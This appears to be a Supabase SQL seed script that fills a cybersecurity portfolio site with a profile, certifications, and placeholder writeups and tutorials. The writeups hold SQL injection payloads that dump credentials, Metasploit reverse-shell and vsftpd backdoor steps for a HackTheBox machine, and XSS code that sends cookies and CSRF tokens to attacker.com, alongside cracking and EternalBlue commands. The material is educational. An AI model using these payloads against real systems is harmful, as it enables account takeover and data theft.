-- Insert Dummy Data for CyberSec Portfolio
-- Script ini akan menggunakan user yang sudah dibuat di Supabase Dashboard

DO $$
DECLARE
    user_uuid uuid;
    profile_uuid uuid;
BEGIN
    -- Ambil user_id dari user yang sudah dibuat di Dashboard Supabase
    -- Ganti email ini dengan email user yang sudah Anda buat di Dashboard
    SELECT id INTO user_uuid FROM auth.users WHERE email = 'fakhrityhikmawan@gmail.com';
    
    -- Cek apakah user ditemukan
    IF user_uuid IS NULL THEN
        RAISE EXCEPTION 'User dengan email fakhrityhikmawan@gmail.com tidak ditemukan. Pastikan user sudah dibuat di Supabase Dashboard.';
    ELSE
        RAISE NOTICE 'User ditemukan dengan ID: %', user_uuid;
    END IF;

    -- Create or update profile untuk user yang sudah ada
    INSERT INTO profiles (
        id,
        user_id,
        name,
        title,
        bio,
        experience,
        skills,
        github_url,
        linkedin_url,
        twitter_url,
        created_at,
        updated_at
    ) VALUES (
        gen_random_uuid(),
        user_uuid,
        'Fakhri Tyhikmawan',
        'Cybersecurity Analyst & Bug Bounty Hunter',
        'Cyber Security Analyst with a Bachelor''s in Computer Engineering from Telkom University. Experienced in real-time security monitoring, threat analysis, and implementing defense strategies at PT. Defender Nusa Semesta (Defenxor). Skilled in Microsoft Defender, Azure security, and compliance management. Focused on optimizing web applications and collaborating in team-driven environments.',
        'Cybersecurity Analyst with 2+ years of hands-on experience in penetration testing and security research. Led security assessments for Fortune 500 companies and discovered 100+ critical vulnerabilities. Certified ethical hacker with expertise in web application security, network penetration testing, and mobile security. Active bug bounty hunter with $50,000+ in total earnings across multiple platforms including HackerOne and Bugcrowd.',
        ARRAY[
            'Web Application Security',
            'Network Penetration Testing',
            'Social Engineering',
            'Bug Bounty Hunting',
            'OWASP Top 10',
            'Metasploit Framework',
            'Nmap & Nessus',
            'Wireshark',
            'Python & Bash Scripting',
            'Microsoft Defender',
            'Azure Security',
            'Compliance Management'
        ],
        'https://github.com/fahixa',
        'https://linkedin.com/in/fakhrity-hikmawan',
        'https://twitter.com/fakhrityhikmawan',
        now(),
        now()
    ) ON CONFLICT (user_id) DO UPDATE SET
        name = EXCLUDED.name,
        title = EXCLUDED.title,
        bio = EXCLUDED.bio,
        experience = EXCLUDED.experience,
        skills = EXCLUDED.skills,
        github_url = EXCLUDED.github_url,
        linkedin_url = EXCLUDED.linkedin_url,
        twitter_url = EXCLUDED.twitter_url,
        updated_at = now()
    RETURNING id INTO profile_uuid;

    RAISE NOTICE 'Profile created/updated dengan ID: %', profile_uuid;

    -- Add certifications
    INSERT INTO certifications (
        id,
        profile_id,
        name,
        issuer,
        validation_url,
        logo_url,
        issue_date,
        expiry_date,
        created_at,
        updated_at
    ) VALUES 
        (
            gen_random_uuid(),
            profile_uuid,
            'Certified Ethical Hacker (CEH)',
            'EC-Council',
            'https://aspen.eccouncil.org/VerifyCredential',
            'https://images.credly.com/size/340x340/images/c2ddc533-ba6c-464d-ac59-b0c44d3d8b16/image.png',
            '2023-06-15',
            '2026-06-15',
            now(),
            now()
        ),
        (
            gen_random_uuid(),
            profile_uuid,
            'OSCP - Offensive Security Certified Professional',
            'Offensive Security',
            'https://www.offensive-security.com/offsec/oscp/',
            'https://images.credly.com/size/340x340/images/ec81134d-e80b-4eb5-ae07-0eb8e1a60fcd/image.png',
            '2023-03-20',
            NULL,
            now(),
            now()
        ),
        (
            gen_random_uuid(),
            profile_uuid,
            'CompTIA Security+',
            'CompTIA',
            'https://www.certmetrics.com/comptia/public/verification.aspx',
            'https://images.credly.com/size/340x340/images/74790a75-8451-400a-8536-92d792b5184a/Security_2B.png',
            '2022-08-10',
            '2025-08-10',
            now(),
            now()
        )
    ON CONFLICT DO NOTHING;

    RAISE NOTICE 'Certifications added successfully';

    -- Add writeups
    INSERT INTO writeups (
        id,
        user_id,
        title,
        slug,
        excerpt,
        content,
        category,
        difficulty,
        tags,
        published,
        created_at,
        updated_at
    ) VALUES
        (
            gen_random_uuid(),
            user_uuid,
            'Critical SQL Injection Leading to Complete Database Compromise',
            'critical-sql-injection-database-compromise',
            'Discovered a critical SQL injection vulnerability in a major e-commerce platform that led to complete database access and a $5,000 bounty reward.',
            '# Critical SQL Injection Leading to Complete Database Compromise

## Executive Summary
During a bug bounty assessment on a major e-commerce platform, I discovered a critical SQL injection vulnerability that allowed complete database access, including customer data, payment information, and administrative credentials.

**Bounty Reward:** $5,000
**Severity:** Critical (CVSS 9.8)
**Impact:** Complete database compromise

## Discovery Process

### Initial Reconnaissance
```bash
subfinder -d target.com | httpx -silent
whatweb target.com
wappalyzer target.com
```

### Vulnerability Discovery
The product search functionality reflected user input directly into SQL queries.

**Vulnerable Endpoint:** `https://target.com/search?q=[PAYLOAD]`

### Proof of Concept
#### Error-based SQL Injection
```sql
search?q=test'' OR 1=1--
search?q=test'' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

#### Union-based Injection
```sql
search?q=test'' UNION SELECT 1,2,3,4,5,6,7,8--
search?q=test'' UNION SELECT 1,database(),user(),version(),5,6,7,8--
```

#### Data Extraction
```sql
search?q=test'' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7,8 FROM information_schema.tables WHERE table_schema=database()--
search?q=test'' UNION SELECT 1,GROUP_CONCAT(username,0x3a,email,0x3a,password),3,4,5,6,7,8 FROM users--
```

## Impact Assessment
- **User accounts:** 2.5 million user records
- **Payment data:** Credit card information (encrypted)
- **Administrative access:** Admin credentials exposed
- **Business data:** Product information, pricing, inventory

## Remediation
1. Input sanitization: implement strict validation
2. Parameterized queries: use prepared statements
3. Least privilege: limit database user permissions
4. WAF deployment: implement web application firewall

## Timeline
- **Discovery:** January 15, 2024
- **Initial Report:** January 15, 2024 (within 2 hours)
- **Vendor Response:** January 16, 2024
- **Fix Deployed:** January 20, 2024
- **Bounty Awarded:** January 25, 2024
- **Public Disclosure:** March 15, 2024',
            'bug-bounty',
            'hard',
            ARRAY['sql-injection','web-security','database','bug-bounty','critical'],
            true,
            now(),
            now()
        ),
        (
            gen_random_uuid(),
            user_uuid,
            'HackTheBox - Lame Machine Complete Walkthrough',
            'hackthebox-lame-machine-walkthrough',
            'Detailed walkthrough of the Lame machine from HackTheBox, demonstrating SMB exploitation techniques and privilege escalation methods.',
            '# HackTheBox - Lame Machine Complete Walkthrough

## Machine Information
- **Name:** Lame
- **OS:** Linux (Ubuntu)
- **Difficulty:** Easy
- **Points:** 20
- **Release Date:** March 14, 2017
- **Retired:** May 26, 2017

## Overview
Lame is a beginner-friendly Linux machine that focuses on exploiting vulnerable services, particularly Samba. This machine is perfect for learning basic enumeration and exploitation techniques.

## Reconnaissance
### Initial Nmap Scan
```bash
nmap -p- --min-rate 10000 10.10.10.3
nmap -p 21,22,139,445,3632 -sC -sV -oA lame 10.10.10.3
```

### Scan Results
```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X-4.X
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian
3632/tcp open  distccd     distccd v1 (GNU 4.2.4)
```

### Service Enumeration
```bash
enum4linux 10.10.10.3
smbclient -L //10.10.10.3
```

## Vulnerability Analysis
1. Samba 3.0.20 username map script (CVE-2007-2447)
2. vsftpd 2.3.4 backdoor (CVE-2011-2523)
3. distccd remote code execution (CVE-2004-2687)

## Exploitation
### Samba Exploit (usermap_script)
```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set PAYLOAD cmd/unix/reverse_bash
exploit
```

### vsftpd Backdoor
```bash
telnet 10.10.10.3 21
USER test:)
PASS test
telnet 10.10.10.3 6200
```

## Post-Exploitation
- Gained root access immediately
- Retrieved user and root flags
- No privilege escalation needed

## Key Takeaways
- Always check for known vulnerabilities in identified services
- SMB services often have critical vulnerabilities
- Keep systems updated to prevent exploitation',
            'ctf',
            'easy',
            ARRAY['hackthebox','smb','metasploit','linux','samba'],
            true,
            now(),
            now()
        ),
        (
            gen_random_uuid(),
            user_uuid,
            'XSS to Account Takeover: A Complete Attack Chain',
            'xss-account-takeover-attack-chain',
            'Demonstrating how a simple XSS vulnerability can be escalated to complete account takeover through session hijacking and CSRF attacks.',
            '# XSS to Account Takeover: A Complete Attack Chain

## Introduction
Cross-Site Scripting (XSS) vulnerabilities are often underestimated, but when properly exploited they can lead to complete account takeover. This writeup demonstrates a complete attack chain from XSS discovery to full account compromise.

## Discovery
During a penetration test on a social media platform, I discovered a stored XSS vulnerability in the user profile bio section.

**Vulnerable Endpoint:** `/profile/update`
**Parameter:** `bio`
**Payload:** `<script>alert(''XSS'')</script>`

## Exploitation Chain

### Step 1: Session Cookie Theft
```javascript
<script>
fetch(''https://attacker.com/steal.php?cookie='' + document.cookie);
</script>
```

### Step 2: CSRF Token Extraction
```javascript
<script>
fetch(''/settings'')
  .then(response => response.text())
  .then(html => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, ''text/html'');
    const token = doc.querySelector(''input[name="csrf_token"]'').value;
    
    // Send token to attacker server
    fetch(''https://attacker.com/token.php?csrf='' + token);
  });
</script>
```

### Step 3: Email & Password Change
```javascript
<script>
// Change email
fetch(''/settings/email'', {
  method: ''POST'',
  headers: {
    ''Content-Type'': ''application/x-www-form-urlencoded'',
  },
  body: ''email=attacker@evil.com&csrf_token='' + token
});

// Change password
fetch(''/settings/password'', {
  method: ''POST'',
  headers: {
    ''Content-Type'': ''application/x-www-form-urlencoded'',
  },
  body: ''password=newpassword123&csrf_token='' + token
});
</script>
```

## Impact
- Complete account takeover
- Access to private messages and data
- Ability to impersonate the victim
- Potential for further lateral movement

## Remediation
1. **Input Sanitization**: Properly encode all user inputs
2. **Content Security Policy**: Implement strict CSP headers
3. **HttpOnly Cookies**: Prevent JavaScript access to session cookies
4. **SameSite Cookies**: Protect against CSRF attacks
5. **Regular Security Testing**: Implement automated XSS detection

## Timeline
- **Discovery:** February 10, 2024
- **Reported:** February 10, 2024
- **Acknowledged:** February 11, 2024
- **Fixed:** February 15, 2024
- **Bounty:** $3,500

## Lessons Learned
- XSS vulnerabilities should never be underestimated
- Defense in depth is crucial for web application security
- Regular security testing can prevent such vulnerabilities',
            'bug-bounty',
            'medium',
            ARRAY['xss','csrf','account-takeover','web-security','social-engineering'],
            true,
            now(),
            now()
        )
    ON CONFLICT (slug) DO NOTHING;

    RAISE NOTICE 'Writeups added successfully';

    -- Add articles with complete content
    INSERT INTO articles (
        id,
        user_id,
        title,
        slug,
        excerpt,
        content,
        category,
        featured,
        published,
        read_time,
        tags,
        created_at,
        updated_at
    ) VALUES
        (
            gen_random_uuid(),
            user_uuid,
            'Complete Guide to Web Application Security Testing',
            'complete-guide-web-application-security-testing',
            'A comprehensive guide covering methodologies, tools, and best practices for web application security testing in 2024.',
            '# Complete Guide to Web Application Security Testing

## Table of Contents
1. [Testing Methodology](#testing-methodology)
2. [Essential Tools](#essential-tools)
3. [OWASP Top 10 Testing](#owasp-top-10-testing)
4. [Advanced Techniques](#advanced-techniques)
5. [Automation and CI/CD](#automation-and-cicd)
6. [Best Practices](#best-practices)

## Testing Methodology

### 1. Information Gathering
- **Passive Reconnaissance**: Use tools like Google dorking, Shodan, and social media
- **Active Reconnaissance**: Direct interaction with the target application
- **Technology Stack Identification**: Determine frameworks, databases, and server technologies

### 2. Authentication & Authorization Testing
- **Brute Force Protection**: Test account lockout mechanisms
- **Session Management**: Analyze session tokens and cookie security
- **Multi-Factor Authentication**: Test MFA implementation and bypass techniques
- **Password Policies**: Verify strength requirements and storage

### 3. Input Validation Testing
- **SQL Injection**: Test all input fields for database injection
- **Cross-Site Scripting (XSS)**: Test for reflected, stored, and DOM-based XSS
- **Command Injection**: Test for OS command execution
- **File Upload**: Test for malicious file upload vulnerabilities

## Essential Tools

### Automated Scanners
- **Burp Suite Professional**: Industry-standard web application security testing platform
- **OWASP ZAP**: Free and open-source security testing proxy
- **Nessus**: Comprehensive vulnerability scanner
- **Acunetix**: Commercial web vulnerability scanner

### Manual Testing Tools
- **Burp Suite**: Web application security testing platform
- **SQLMap**: Automated SQL injection testing tool
- **Nikto**: Web server scanner
- **Gobuster**: Directory and file brute-forcer

### Browser Extensions
- **Wappalyzer**: Technology stack identification
- **Cookie Editor**: Cookie manipulation
- **User-Agent Switcher**: Change browser user agent

## OWASP Top 10 Testing

### A01: Broken Access Control
```bash
# Test for horizontal privilege escalation
GET /user/profile?id=123 HTTP/1.1
GET /user/profile?id=124 HTTP/1.1

# Test for vertical privilege escalation
GET /admin/dashboard HTTP/1.1
Authorization: Bearer user_token
```

### A02: Cryptographic Failures
- Test for weak encryption algorithms
- Check for hardcoded secrets in source code
- Verify proper key management
- Test SSL/TLS configuration

### A03: Injection
```sql
-- SQL Injection Testing
'' OR 1=1--
'' UNION SELECT 1,2,3--
'' AND (SELECT SUBSTRING(@@version,1,1))=''5''--
```

```javascript
// XSS Testing
<script>alert(''XSS'')</script>
<img src=x onerror=alert(''XSS'')>
javascript:alert(''XSS'')
```

## Advanced Techniques

### Business Logic Testing
- Test workflow bypasses
- Verify rate limiting
- Test for race conditions
- Validate business rules

### API Security Testing
```bash
# Test API endpoints
curl -X GET "https://api.example.com/users" -H "Authorization: Bearer token"
curl -X POST "https://api.example.com/users" -d ''{"role":"admin"}''
```

### Mobile Application Testing
- Test API endpoints used by mobile apps
- Analyze mobile app binaries
- Test deep linking vulnerabilities

## Automation and CI/CD

### Integrating Security Testing
```yaml
# Example GitHub Actions workflow
name: Security Testing
on: [push, pull_request]
jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Run OWASP ZAP
        uses: zaproxy/action-baseline@v0.4.0
        with:
          target: ''https://example.com''
```

### Continuous Monitoring
- Implement automated vulnerability scanning
- Set up security alerts and notifications
- Regular penetration testing schedules

## Best Practices

### Before Testing
1. **Get Written Authorization**: Always obtain proper authorization before testing
2. **Define Scope**: Clearly define what is in and out of scope
3. **Backup Plans**: Have rollback procedures for any changes

### During Testing
1. **Document Everything**: Keep detailed notes of all findings
2. **Verify Findings**: Confirm vulnerabilities before reporting
3. **Minimize Impact**: Avoid causing damage or disruption

### After Testing
1. **Provide Clear Reports**: Include executive summaries and technical details
2. **Offer Remediation Guidance**: Provide specific steps to fix issues
3. **Follow Up**: Verify that fixes have been properly implemented

## Reporting and Communication

### Executive Summary
- High-level overview of findings
- Business impact assessment
- Risk ratings and priorities

### Technical Details
- Step-by-step reproduction steps
- Proof-of-concept code
- Screenshots and evidence

### Remediation Recommendations
- Specific fix instructions
- Code examples where applicable
- Timeline recommendations

## Conclusion
Web application security testing is an ongoing process that requires a combination of automated tools, manual techniques, and business understanding. Regular testing helps organizations identify and remediate vulnerabilities before they can be exploited by attackers.

Stay updated with the latest security trends, tools, and techniques to ensure comprehensive coverage of potential vulnerabilities.',
            'tutorial',
            true,
            true,
            15,
            ARRAY['web-security','penetration-testing','owasp','security-testing','methodology'],
            now(),
            now()
        ),
        (
            gen_random_uuid(),
            user_uuid,
            'Top 15 Cybersecurity Tools Every Professional Should Master',
            'top-15-cybersecurity-tools-professional',
            'Essential cybersecurity tools that every security professional should have in their arsenal, from reconnaissance to exploitation and defense.',
            '# Top 15 Cybersecurity Tools Every Professional Should Master

## Introduction
In the rapidly evolving cybersecurity landscape, having the right tools can make the difference between success and failure. This comprehensive guide covers the top 15 tools that every cybersecurity professional should master.

## 1. Nmap - Network Discovery and Security Auditing

### Overview
Nmap (Network Mapper) is a free and open-source utility for network discovery and security auditing.

### Key Features
- Port scanning
- OS detection
- Service version detection
- Vulnerability detection scripts

### Essential Commands
```bash
# Basic scan
nmap target.com

# Comprehensive scan
nmap -A -T4 target.com

# Stealth scan
nmap -sS target.com

# UDP scan
nmap -sU target.com

# Script scan
nmap --script vuln target.com
```

## 2. Burp Suite - Web Application Security Testing

### Overview
Burp Suite is the leading toolkit for web application security testing.

### Key Features
- Intercepting proxy
- Web vulnerability scanner
- Intruder for automated attacks
- Repeater for manual testing

### Pro Tips
- Use Burp Collaborator for out-of-band testing
- Leverage extensions from the BApp Store
- Master the Intruder tool for complex attacks

## 3. Metasploit Framework - Penetration Testing Platform

### Overview
Metasploit is the world''s most used penetration testing framework.

### Key Features
- Exploit database
- Payload generation
- Post-exploitation modules
- Auxiliary modules

### Essential Commands
```bash
# Start Metasploit
msfconsole

# Search for exploits
search type:exploit platform:windows

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
exploit
```

## 4. Wireshark - Network Protocol Analyzer

### Overview
Wireshark is the world''s foremost network protocol analyzer.

### Key Features
- Live packet capture
- Deep inspection of protocols
- Rich VoIP analysis
- Powerful display filters

### Useful Filters
```
# HTTP traffic
http

# Specific IP
ip.addr == 192.168.1.100

# TCP SYN packets
tcp.flags.syn == 1

# DNS queries
dns
```

## 5. John the Ripper - Password Cracking

### Overview
John the Ripper is a fast password cracker.

### Key Features
- Multiple hash formats
- Wordlist attacks
- Brute force attacks
- Custom rules

### Usage Examples
```bash
# Crack with wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Brute force
john --incremental hashes.txt

# Show cracked passwords
john --show hashes.txt
```

## 6. Hashcat - Advanced Password Recovery

### Overview
Hashcat is the world''s fastest and most advanced password recovery utility.

### Key Features
- GPU acceleration
- Multiple attack modes
- Rule-based attacks
- Distributed cracking

### Attack Modes
```bash
# Dictionary attack
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# Brute force
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a

# Combinator attack
hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt
```

## 7. SQLMap - Automatic SQL Injection Tool

### Overview
SQLMap is an open-source penetration testing tool that automates SQL injection detection and exploitation.

### Key Features
- Database fingerprinting
- Data extraction
- File system access
- Operating system takeover

### Common Usage
```bash
# Basic test
sqlmap -u "http://target.com/page.php?id=1"

# Extract databases
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Extract tables
sqlmap -u "http://target.com/page.php?id=1" -D database --tables

# Dump data
sqlmap -u "http://target.com/page.php?id=1" -D database -T table --dump
```

## 8. Gobuster - Directory/File Brute-forcer

### Overview
Gobuster is a tool used to brute-force URIs, DNS subdomains, and virtual host names.

### Key Features
- Fast scanning
- Multiple modes
- Custom wordlists
- Pattern matching

### Usage Examples
```bash
# Directory enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# DNS subdomain enumeration
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt

# Virtual host enumeration
gobuster vhost -u http://target.com -w /usr/share/wordlists/subdomains.txt
```

## 9. Nikto - Web Server Scanner

### Overview
Nikto is an open-source web server scanner that performs comprehensive tests.

### Key Features
- Outdated software detection
- Dangerous files/programs
- Server configuration issues
- Default files and programs

### Basic Usage
```bash
# Basic scan
nikto -h http://target.com

# Scan with specific plugins
nikto -h http://target.com -Plugins "@@ALL"

# Output to file
nikto -h http://target.com -o results.html -Format htm
```

## 10. Aircrack-ng - Wireless Security Assessment

### Overview
Aircrack-ng is a complete suite of tools to assess WiFi network security.

### Key Features
- Packet capture
- WEP/WPA/WPA2 cracking
- Fake access point creation
- Packet injection

### Workflow
```bash
# Monitor mode
airmon-ng start wlan0

# Capture packets
airodump-ng wlan0mon

# Capture handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Crack WPA
aircrack-ng -w wordlist.txt capture.cap
```

## Conclusion
Mastering these 15 cybersecurity tools will provide you with a comprehensive toolkit for various security scenarios. Remember that tools are only as effective as the person using them, so invest time in understanding the underlying concepts and methodologies.

Stay curious, keep learning, and always use these tools responsibly and ethically.',
            'tools',
            false,
            true,
            20,
            ARRAY['tools','penetration-testing','nmap','burp-suite','metasploit','cybersecurity'],
            now(),
            now()
        ),
        (
            gen_random_uuid(),
            user_uuid,
            'Building a Successful Career in Cybersecurity: A Complete Roadmap',
            'building-successful-career-cybersecurity-roadmap',
            'Comprehensive guide to starting and advancing your cybersecurity career, from entry-level positions to senior roles.',
            '# Building a Successful Career in Cybersecurity: A Complete Roadmap

## Introduction
The cybersecurity industry is experiencing unprecedented growth, with millions of unfilled positions worldwide. This comprehensive guide will help you navigate your journey from beginner to cybersecurity expert.

## Chapter 1: Educational Foundation

### Formal Education
- **Computer Science Degree**: Provides strong technical foundation
- **Cybersecurity Degree**: Specialized knowledge in security principles
- **Information Technology**: Practical skills in system administration
- **Alternative Paths**: Bootcamps, online courses, self-study

### Core Knowledge Areas
1. **Networking Fundamentals**
   - TCP/IP protocol suite
   - OSI model
   - Routing and switching
   - Network protocols (HTTP/HTTPS, DNS, DHCP)

2. **Operating Systems**
   - Windows administration
   - Linux/Unix systems
   - Command line proficiency
   - System hardening

3. **Programming Skills**
   - Python for automation
   - PowerShell for Windows environments
   - Bash scripting for Linux
   - SQL for database queries

## Chapter 2: Hands-On Experience

### Home Lab Setup
```bash
# Essential tools for your lab
# Virtualization platform
VMware Workstation / VirtualBox

# Operating systems
Kali Linux
Windows 10/11
Ubuntu Server
pfSense

# Vulnerable applications
DVWA (Damn Vulnerable Web Application)
Metasploitable
VulnHub VMs
HackTheBox
```

### Practical Learning Platforms
- **TryHackMe**: Beginner-friendly cybersecurity training
- **HackTheBox**: Advanced penetration testing practice
- **VulnHub**: Vulnerable VMs for practice
- **OverTheWire**: Wargames and challenges
- **PentesterLab**: Web application security training

### Building Your Portfolio
1. **Document Your Learning**
   - Create detailed writeups
   - Share on GitHub
   - Start a security blog
   - Contribute to open source projects

2. **Practical Projects**
   - Set up a SIEM solution
   - Create security automation scripts
   - Perform vulnerability assessments
   - Develop security tools

## Chapter 3: Certifications Roadmap

### Entry Level (0-2 years)
```
CompTIA Security+ → CompTIA Network+ → CompTIA CySA+
```

### Intermediate Level (2-5 years)
```
Specialized tracks:

Penetration Testing:
CEH → OSCP → GPEN

Incident Response:
GCIH → GCFA → GNFA

Security Management:
CISSP → CISM → CISA

Cloud Security:
AWS Security → Azure Security → CCSP
```

### Advanced Level (5+ years)
```
Expert certifications:

OSEE (Exploit Development)
GXPN (Advanced Penetration Testing)
CISSP (Security Management)
SABSA (Security Architecture)
```

### Certification Strategy
- **Start with fundamentals**: Security+ is widely recognized
- **Choose your path**: Align with career goals
- **Hands-on first**: Get practical experience before advanced certs
- **Continuous learning**: Maintain and renew certifications

## Chapter 4: Specialization Areas

### 1. Penetration Testing
**Role**: Ethical hacker who finds vulnerabilities
**Skills needed**:
- Network and web application testing
- Exploit development
- Social engineering
- Report writing

**Career path**:
Junior Pentester → Senior Pentester → Lead Pentester → Security Consultant

### 2. Incident Response
**Role**: Respond to and investigate security incidents
**Skills needed**:
- Digital forensics
- Malware analysis
- Threat hunting
- Crisis management

**Career path**:
SOC Analyst → Incident Responder → Senior IR Analyst → IR Manager

### 3. Security Architecture
**Role**: Design secure systems and infrastructure
**Skills needed**:
- Enterprise architecture
- Risk assessment
- Compliance frameworks
- Technology evaluation

**Career path**:
Security Analyst → Security Architect → Principal Architect → CISO

### 4. Governance, Risk, and Compliance (GRC)
**Role**: Ensure organizational compliance with security standards
**Skills needed**:
- Risk management
- Audit procedures
- Regulatory knowledge
- Policy development

**Career path**:
Compliance Analyst → Risk Analyst → GRC Manager → Chief Risk Officer

### 5. Cloud Security
**Role**: Secure cloud infrastructure and services
**Skills needed**:
- Cloud platforms (AWS, Azure, GCP)
- Container security
- DevSecOps
- Infrastructure as Code

**Career path**:
Cloud Security Analyst → Cloud Security Engineer → Cloud Security Architect

## Conclusion
Building a successful cybersecurity career requires dedication, continuous learning, and strategic planning. The field offers excellent opportunities for growth, competitive salaries, and the satisfaction of protecting organizations and individuals from cyber threats.

Remember that cybersecurity is not just about technology—it''s about people, processes, and business understanding. Develop both technical and soft skills, stay curious, and always maintain ethical standards in your work.

The journey may be challenging, but the rewards—both personal and professional—make it worthwhile. Start where you are, use what you have, and do what you can. Your cybersecurity career awaits!',
            'career',
            false,
            true,
            25,
            ARRAY['career','cybersecurity','professional-development','certifications','salary'],
            now(),
            now()
        )
    ON CONFLICT (slug) DO NOTHING;

    RAISE NOTICE 'Articles added successfully';

    RAISE NOTICE 'All dummy data has been inserted successfully!';
    RAISE NOTICE 'User ID: %', user_uuid;
    RAISE NOTICE 'Profile ID: %', profile_uuid;

END $$;

-- Final status message
SELECT 'Data dummy berhasil ditambahkan! User yang sudah dibuat di Dashboard akan terhubung dengan data ini.' AS status;